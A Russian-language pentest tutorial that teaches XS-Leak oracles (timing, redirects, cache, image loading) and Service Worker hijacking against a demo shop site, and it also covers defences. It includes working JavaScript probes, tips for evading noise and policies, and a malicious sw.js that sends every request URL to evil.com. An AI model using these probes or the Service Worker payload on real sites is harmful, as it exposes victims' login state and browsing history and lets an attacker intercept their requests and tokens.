## Задача

SOP запрещает читать чужой ответ. Но даже **без чтения** можно узнать о жертве очень много — по косвенным признакам: изменилось ли время ответа, случился ли редирект, отрисовалась ли картинка. Это класс **XS-Leaks** (cross-site leaks). А **Service Worker** — фоновый скрипт, который может перехватывать запросы страницы, и если его подсунуть, контроль над сайтом полный.

Разберём оба на одном домене.

## Наш пример: поиск на shop.local

У магазина есть страница поиска, и результат зависит от того, что знает о нас сервер:

```bash
$ curl -s 'https://shop.local/search?q=secret' -o /dev/null -w '%{http_code} %{time_total}\n'
200 0.052
```

Ответ приходит за 52 мс. Но если товар существует, сервер делает тяжёлый запрос к базе:

```bash
$ curl -s 'https://shop.local/search?q=teapot' -o /dev/null -w '%{http_code} %{time_total}\n'
200 0.410
```

410 мс против 52 мс. Разница — сигнал: **существование товара протекает по времени ответа**, хотя прочитать страницу мы не можем.

## Шаг 1: XS-Leak через timing

Замеряем время на стороне нашего сайта, пользуясь тем, что `<img>` или `fetch` в `no-cors` режиме позволяют измерить длительность:

```javascript
const t0 = performance.now();
fetch('https://shop.local/search?q=teapot', {mode:'no-cors'})
  .finally(() => {
    const dt = performance.now() - t0;
    if (dt > 300) report('exists');
  });
```

Так, перебирая варианты, мы восстанавливаем информацию о жертве (её корзину, заказы, наличие товара). Это **XS-Leak через тайминг**.

## Шаг 2: XS-Leak через другие сигналы

Время — не единственный оракул. Браузер даёт ещё несколько «побочных каналов»:

- **Размер через `Content-Length`/`onload`:** если картинка загрузилась (`onload`), значит, URL валиден.
- **Кэш:** загрузив ресурс, проверяем, попал ли он в кэш (по времени) — узнаём, посещал ли жертва страницу.
- **Фреймы:** `window.frames.length`, `X-Frame-Options` (сработал ли `onload`).
- **Редиректы:** `fetch` с `redirect:'manual'` покажет, был ли редирект, через `type:'opaqueredirect'`.

```javascript
fetch('https://shop.local/account/orders', {redirect:'manual', mode:'no-cors'})
  .then(r => { if (r.type === 'opaqueredirect') report('redirected'); });
```

Здесь редирект означает «не залогинен» — а его отсутствие означает «залогинен». Мы узнали статус жертвы, не прочитав ни байта.

## Шаг 3: почему XS-Leaks опасны

По отдельности сигналы безобидны, но вместе дают **оракул**: зная, как выглядит ответ для «да» и «нет», можно вытянуть данные. Защита — не в CORS, а в том, чтобы ответы не различались: одинаковое время (`timing-safe`), `Cross-Origin-Opener-Policy`, `SameSite`, запрет на кэширование чувствительных страниц.

## Шаг 4: Service Worker — фоновый перехватчик

**Service Worker (SW)** — скрипт, который регистрируется на origin и перехватывает запросы страницы (через событие `fetch`), даже когда вкладка закрыта. Проверим, регистрирует ли магазин SW:

```bash
$ curl -s https://shop.local/sw.js | head -5
self.addEventListener('fetch', e => {
  e.respondWith(fetch(e.request));
});
```

Если файл `sw.js` отдаётся с нашего контроля (например, через загрузку или XSS), мы подменим его содержимое:

```javascript
self.addEventListener('fetch', e => {
  e.respondWith(fetch('https://evil.com/collect?u=' + encodeURIComponent(e.request.url)));
});
```

Теперь каждый запрос страницы уходит нам. Это полный контроль над origin.

## Шаг 5: зачем SW в пентесте

- **Устойчивость:** SW живёт после закрытия вкладки — это **persistence** без файла на сервере.
- **Обход CSP:** SW может отдавать собственные ответы, обходя часть политик.
- **Кража при навигации:** перехват всех запросов, включая токены в URL.
- **Условия:** нужен контроль над `sw.js` (загрузка, XSS, `importScripts` из чужого домена).

Проверка: зарегистрирован ли SW, какой scope, есть ли `importScripts` на внешний домен.

## Если не сработало

- **XS-Leak шумит** — усредняй много запросов; используй стабильные сигналы (`onload`, редирект), а не время.
- **COOP/COEP включены** — часть каналов закрыта; пробуй другие (кэш, фреймы).
- **SW не регистрируется** — ищи обход: подмена через открытый редирект на `sw.js`, XSS, `importScripts`.
- **Нет загрузки файлов** — SW-вектор закрыт; вернись к XS-Leaks.

## Что мы теперь знаем

- XS-Leaks вытягивают данные **без чтения** ответа — по времени, редиректам, кэшу, фреймам.
- Оракул строится на различии ответов «да»/«нет»; защита — унифицировать ответы.
- Service Worker перехватывает запросы origin — это устойчивый контроль при подмене `sw.js`.
- Условие SW-атаки — контроль над скриптом (загрузка, XSS, внешний `importScripts`).

## Частые вопросы

**XS-Leak — это уязвимость?** Скорее **техника утечки**. Сама по себе она не баг, но позволяет вытянуть данные, которые SOP закрывает. В отчёте это «информационная утечка».

**Почему утечка возможна без чтения?** Браузер всё равно **обрабатывает** ответ: грузит картинку, следует редиректу, кэширует. Эти побочные эффекты и есть оракул.

**Как защититься от XS-Leaks?** Унифицировать ответы: одинаковое время, одинаковые размеры, `SameSite`, `Cross-Origin-Opener-Policy`, запрет кэширования чувствительных страниц.

**Service Worker — это про XSS?** Частично: подмена `sw.js` обычно требует XSS или загрузки файла. Но эффект сильнее — SW переживает закрытие вкладки и контролирует все запросы.

**Зачем SW в реальном пентесте?** Для **persistence**: устойчивый контроль над origin без файла на сервере, перехват токенов и навигации.

**Насколько это шумно?** XS-Leaks — тихо (много мелких запросов). Регистрация SW заметнее. Учитывай в OPSEC.

## Ещё один сценарий: утечка через размер и кэш

Ещё один оракул — **размер ответа** через `Content-Length`. Если страница «залогинен» длиннее, чем «не залогинен», размер выдаёт статус:

```javascript
// грузим картинку и измеряем по onload/onerror
const img = new Image();
img.onload  = () => report('resource-exists');
img.onerror = () => report('missing');
img.src = 'https://shop.local/account/avatar.png';
```

А **кэш** выдаёт, посещала ли жертва страницу: если ресурс уже в кэше, повторный запрос отработает почти мгновенно:

```javascript
const t0 = performance.now();
fetch('https://shop.local/private/notes', {mode:'no-cors'})
  .finally(() => report(performance.now() - t0 < 5 ? 'cached' : 'not-cached'));
```

Оба сигнала не читают контент, но восстанавливают факты о жертве.

## На что смотреть дальше

- **Одинаковость ответов.** Разное время/размер для «да» и «нет» — это оракул.
- **Редиректы.** `opaqueredirect` отличает «залогинен» от «нет».
- **Кэш.** Быстрый повторный запрос выдаёт, что ресурс уже посещался.
- **Фреймы.** `onload`/`X-Frame-Options` показывают, отрисовалась ли страница.
- **Заголовки политик.** `Cross-Origin-Opener-Policy`, `SameSite`, `Cache-Control`.
- **Service Worker.** Проверь регистрацию, scope и внешний `importScripts`.

## Куда дальше

На этом ветвь «Браузер» завершена. Дальше — инъекции (`web-sqli`) и десериализация (`web-deserialization`). А пока главное запомни: **данные утекают даже без чтения — по времени и побочным каналам; а Service Worker при подмене даёт устойчивый контроль.**
